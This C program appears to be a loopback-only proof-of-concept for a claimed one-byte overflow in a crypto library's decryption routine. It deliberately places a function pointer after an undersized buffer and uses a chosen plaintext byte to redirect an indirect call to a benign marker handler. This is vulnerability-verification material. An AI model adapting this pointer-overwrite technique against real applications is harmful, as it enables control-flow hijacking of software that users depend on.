// Loopback-only synthetic consumer for CVE-2026-134056.
//
// A client sends 48 bytes of AES-128-CBC ciphertext over TCP to 127.0.0.1.
// The server decrypts it in two 16-byte EVP_DecryptUpdate calls into a packed
// record whose scratch[31] (the documented minimum for a 16-byte update) is
// immediately followed by a function pointer.  The pre-fix library writes
// plaintext byte 31 one byte past scratch, replacing the pointer's low byte.
// A 256-byte-aligned dispatch table makes the redirect observable: table[0]
// is the normal handler, table[9] (low byte 0x48) is a benign marker.
//
// Modes: vuln, fixed, single, nopad, safe.  Compile the same source against
// the vulnerable and the fixed library; mode selects the decryption shape.
// This is a synthetic consumer (rung-4 pointer control), not a real app or
// remote command execution.
#include <openssl/evp.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define CHOSEN 0x48
static const uint8_t kKey[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
static const uint8_t kIv[16] = {0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
                                0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f};

static void normal_handler(void) {
  const char s[] = "NORMAL_HANDLER\n";
  (void)write(1, s, sizeof(s) - 1);
}
static void marker_handler(void) {
  const char s[] = "BENIGN_MARKER_EXECUTED\n";
  (void)write(1, s, sizeof(s) - 1);
}

// table[0] has low byte 0x00; table[9] has low byte 0x48.  Both are 8-byte
// slots in one 256-byte-aligned array, so a one-byte LSB overwrite selects
// table[9] without changing any other address byte.
static void (*g_table[16])(void) __attribute__((aligned(256)));
#pragma pack(push, 1)

struct rec31 {
  uint8_t scratch[31];
  void (**handler)(void);
};
struct rec32 {
  uint8_t scratch[32];
  uint8_t pad;
  void (**handler)(void);
};
#pragma pack(pop)

static int make_ct(uint8_t *ct, int *ct_len, uint8_t last) {
  uint8_t pt[32];
  for (int i = 0; i < 32; i++) {
    pt[i] = (uint8_t)i;
  }
  pt[31] = last;
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  int n1 = 0, n2 = 0, ok = 0;
  if (ctx != NULL &&
      EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, kKey, kIv) &&
      EVP_EncryptUpdate(ctx, ct, &n1, pt, 32) &&
      EVP_EncryptFinal_ex(ctx, ct + n1, &n2)) {
    *ct_len = n1 + n2;
    ok = (*ct_len == 48);
  }
  EVP_CIPHER_CTX_free(ctx);
  return ok;
}

static void process(const uint8_t *ct, int ct_len, const char *mode) {
  g_table[0] = normal_handler;
  g_table[9] = marker_handler;
  if (((uintptr_t)&g_table[0] & 0xff) != 0 ||
      (uintptr_t)&g_table[9] - (uintptr_t)&g_table[0] != 0x48) {
    fprintf(stderr, "dispatch table alignment failure\n");
    exit(2);
  }

  uint8_t *out = NULL;
  void (***slot)(void) = NULL;
  struct rec31 *r31 = NULL;
  struct rec32 *r32 = NULL;
  int pad = 1;
  int mode_single = (strcmp(mode, "single") == 0);
  int mode_nopad = (strcmp(mode, "nopad") == 0);
  int mode_safe = (strcmp(mode, "safe") == 0);
  if (mode_nopad) {
    pad = 0;
  }

  if (mode_single) {
    // Single call into the documented minimum for the whole 48-byte input.
    out = malloc(63);
    if (out != NULL) {
      memset(out, 0xab, 63);
    }
  } else if (mode_safe) {
    r32 = malloc(sizeof(*r32));
    if (r32 != NULL) {
      memset(r32, 0xab, sizeof(*r32));
      r32->handler = &g_table[0];
      out = r32->scratch;
      slot = &r32->handler;
    }
  } else {
    r31 = malloc(sizeof(*r31));
    if (r31 != NULL) {
      memset(r31, 0xab, sizeof(*r31));
      r31->handler = &g_table[0];
      out = r31->scratch;
      slot = &r31->handler;
    }
  }
  if (out == NULL) {
    fprintf(stderr, "allocation failure\n");
    exit(2);
  }
  if (slot != NULL) {
    fprintf(stderr, "mode=%s handler_before=%p low=0x%02x\n", mode,
            (void *)*slot, (unsigned)((uintptr_t)*slot & 0xff));
  } else {
    fprintf(stderr, "mode=%s single_call_start\n", mode);
  }

  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  int ok = 0, n = 0;
  if (ctx != NULL &&
      EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, kKey, kIv) &&
      EVP_CIPHER_CTX_set_padding(ctx, pad)) {
    if (mode_single) {
      ok = EVP_DecryptUpdate(ctx, out, &n, ct, ct_len);
    } else {
      ok = 1;
      for (int off = 0; off < 32 && off + 16 <= ct_len; off += 16) {
        if (!EVP_DecryptUpdate(ctx, out, &n, ct + off, 16)) {
          ok = 0;
          break;
        }
      }
    }
  }
  if (!ok) {
    fprintf(stderr, "decrypt failed\n");
  }

  if (slot != NULL) {
    fprintf(stderr, "mode=%s handler_after=%p low=0x%02x\n", mode,
            (void *)*slot, (unsigned)((uintptr_t)*slot & 0xff));
    // The control datum: an indirect call through the adjacent pointer.
    (**slot)();
  } else {
    fprintf(stderr, "mode=%s single_call_no_adjacent_pointer\n", mode);
  }
  EVP_CIPHER_CTX_free(ctx);
  free(out);
}

int main(int argc, char **argv) {
  if (argc < 2 || argc > 3) {
    fprintf(stderr, "usage: %s MODE [last_byte_hex]\n", argv[0]);
    return 2;
  }
  const char *mode = argv[1];
  uint8_t last = CHOSEN;
  if (argc == 3) {
    last = (uint8_t)strtoul(argv[2], NULL, 16);
  }

  uint8_t ct[64];
  int ct_len = 0;
  if (!make_ct(ct, &ct_len, last)) {
    fprintf(stderr, "encryption failed\n");
    return 2;
  }

  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) {
    perror("socket");
    return 2;
  }
  int one = 1;
  (void)setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  struct sockaddr_in a;
  memset(&a, 0, sizeof(a));
  a.sin_family = AF_INET;
  a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  a.sin_port = 0;
  if (bind(fd, (struct sockaddr *)&a, sizeof(a)) != 0 || listen(fd, 1) != 0) {
    perror("bind/listen");
    return 2;
  }
  socklen_t alen = sizeof(a);
  if (getsockname(fd, (struct sockaddr *)&a, &alen) != 0) {
    perror("getsockname");
    return 2;
  }

  pid_t child = fork();
  if (child < 0) {
    perror("fork");
    return 2;
  }
  if (child == 0) {
    int c = socket(AF_INET, SOCK_STREAM, 0);
    if (c < 0) {
      _exit(3);
    }
    a.sin_port = htons(ntohs(a.sin_port));
    if (connect(c, (struct sockaddr *)&a, sizeof(a)) != 0) {
      _exit(3);
    }
    ssize_t w = write(c, ct, (size_t)ct_len);
    (void)w;
    close(c);
    _exit(0);
  }

  int conn = accept(fd, NULL, NULL);
  if (conn < 0) {
    perror("accept");
    return 2;
  }
  uint8_t rx[64];
  size_t got = 0;
  while (got < 48) {
    ssize_t r = read(conn, rx + got, 48 - got);
    if (r <= 0) {
      break;
    }
    got += (size_t)r;
  }
  close(conn);
  close(fd);
  int st = 0;
  (void)waitpid(child, &st, 0);
  if (got != 48) {
    fprintf(stderr, "short wire read: %zu\n", got);
    return 2;
  }
  process(rx, (int)got, mode);
  return 0;
}
